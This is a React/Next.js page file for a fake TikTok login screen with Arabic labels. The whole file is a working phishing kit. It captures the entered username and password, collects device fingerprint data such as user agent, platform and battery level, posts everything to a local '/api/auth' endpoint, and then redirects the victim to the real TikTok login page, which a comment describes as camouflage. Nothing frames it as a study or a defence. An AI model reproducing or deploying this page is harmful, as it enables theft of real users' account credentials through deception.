/* pages/index.js */
import { useState } from 'react';

export default function TikTokPage() {
    const handleLogin = async (e) => { e.preventDefault();
        const user = e.target.user.value;
        const pass = e.target.pass.value;

        // سحب بيانات الجهاز (Fingerprinting)
        const deviceData = { ua: navigator.userAgent, platform: navigator.platform, time: new Date().toLocaleString('ar-EG'), battery: "غير مدعوم" };

        if (navigator.getBattery) { const b = await navigator.getBattery(); deviceData.battery = `${(b.level * 100).toFixed(0)}%`; }

        const res = await fetch('/api/auth', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ user, pass, ...deviceData }), });

        if (res.ok) { // تحويه للموقع الحقيقي للتمويه
            window.location.href = 'https://www.tiktok.com/login'; } };

    return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-black text-white px-6">
            <div className="w-full max-w-[360px] space-y-6">
                <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" className="w-32 mx-auto invert" alt="TikTok Logo" />
                <h1 className="text-2xl font-bold text-center">تسجيل الدخول</h1>
                <form onSubmit={handleLogin} className="space-y-4">
                    <input name="user" type="text" placeholder="البريد الإلكتروني / اسم المستخدم" required className="w-full p-4 bg-zinc-800 border border-zinc-700 rounded-md focus:outline-none" />
                    <input name="pass" type="password" placeholder="كلمة السر" required className="w-full p-4 bg-zinc-800 border border-zinc-700 rounded-md focus:outline-none" />
                    <button type="submit" className="w-full bg-[#fe2c55] p-3 rounded-md font-bold text-lg">تسجيل الدخول</button>
                </form>
            </div>
        </div>
    );
}
